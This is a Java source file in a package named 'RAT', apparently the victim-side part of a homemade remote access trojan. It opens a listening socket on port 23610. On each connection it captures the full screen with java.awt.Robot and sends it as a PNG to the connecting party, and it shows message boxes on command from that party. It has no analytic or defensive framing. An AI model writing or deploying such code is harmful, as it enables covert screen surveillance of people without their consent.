package RAT;
import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

//this is what you connect to and control
public class servercopy {
    static ServerSocket socket;

    public servercopy(int port, boolean custom) {
        if (custom) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Robot rob = new Robot();
                        Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
                        socket = new ServerSocket(port);
                        while (true) {
                            try {
                                Socket so = socket.accept();
                                BufferedImage img = rob.createScreenCapture(new Rectangle(0, 0, (int) d.getWidth(), (int) d.getHeight()));

                                ByteArrayOutputStream ous = new ByteArrayOutputStream();

                                ImageIO.write(img, "png", ous);
                                so.getOutputStream().write(ous.toByteArray());
                                try {
                                    DataInputStream in = new DataInputStream(so.getInputStream());
                                    byte[] msg = new byte[1000];
                                    boolean end = false;
                                    String dataString = "";
                                    String messageString = "";
                                    int bytesRead;
                                    while (!end) {
                                        bytesRead = in.read(msg);
                                        messageString += new String(msg, 0, bytesRead);
                                        if (messageString.substring(1, 7).equals("MSGBOX")) {
                                            String ns = messageString.substring(8, messageString.indexOf(')'));
                                            JOptionPane.showMessageDialog(null, ns);
                                        }
                                    }
                                    System.out.println(messageString);
                                } catch (Exception ex2) {
                                    continue;
                                }
                                try {
                                    Thread.sleep(10);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    continue;
                                }
                            }catch(Exception ex1){
                                ex1.printStackTrace();
                                continue;
                            }
                        }
                    }catch (Exception ex){
                        ex.printStackTrace();
                        //JOptionPane.showMessageDialog(null, ex);
                    }
                }
            }).start();
        }else{
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Robot rob = new Robot();
                        Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
                        while (true) {
                            ServerSocket sock = new ServerSocket(port);
                            Socket so = sock.accept();
                            BufferedImage img = rob.createScreenCapture(new Rectangle(0, 0, (int) d.getWidth(), (int) d.getHeight()));

                            ByteArrayOutputStream ous = new ByteArrayOutputStream();
                            ImageIO.write(img, "png", ous);
                            so.getOutputStream().write(ous.toByteArray());
                            sock.close();
                            try{
                                Thread.sleep(10);
                            }catch(Exception e){
                                e.printStackTrace();
                            }
                        }
                    }catch (Exception ex){
                        ex.printStackTrace();
                        JOptionPane.showMessageDialog(null, ex);
                    }
                }
            }).start();
        }
    }

    public static void main(String[] args) {
        new servercopy(23610, true);
    }
}
